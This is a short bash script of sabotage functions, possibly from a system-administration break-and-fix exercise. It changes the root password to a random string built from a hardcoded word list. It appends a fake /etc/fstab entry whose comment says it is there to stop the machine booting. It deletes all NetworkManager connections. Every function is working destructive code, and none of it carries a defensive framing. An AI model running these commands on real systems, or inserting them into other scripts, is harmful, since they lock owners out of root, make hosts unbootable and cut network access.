#!/bin/bash


change-root-password () {
	#List of different combinations of characters that we're gonna mix for our new secret password
	local list=( egUFkBvvG evJfUQL evJfUQLs bk9PHTX3 zA jrn 7zH zAjrn7zH6J bCwzUA 5dCW5YYT 5dCW 5YYTbX 7uPT3A)

	#Generate our own password from a custom list
	#a. Store a random element from the previous list in variables random1 and random2
        local random1=$(( $RANDOM % ${#list[@]} ))
        local random2=$(( $RANDOM % ${#list[@]} ))
	#b.Mix our two recently created strings in a variable called password
        local password="${list[$random1]}${list[$random2]}"
	
	#For testing purposes were going to print our password via stdout
	echo "Nueva pass: $password"

	#Change the user's actual password
	echo $password | passwd root --stdin
}


break-fstab () {
	#Add a destructive line to /etc/fstab to preclude normal boot
	echo "/dev/not-found     /not-found                       fake     defaults        0 0" >> /etc/fstab

}

delete-nmcli-connections (){
	#Loop over all nmcli existing connections to then delete them all
	for i in $(nmcli connection show | cut -f 1 -d " " | sed '1d')
		do
			nmcli connection delete $i
		done
}


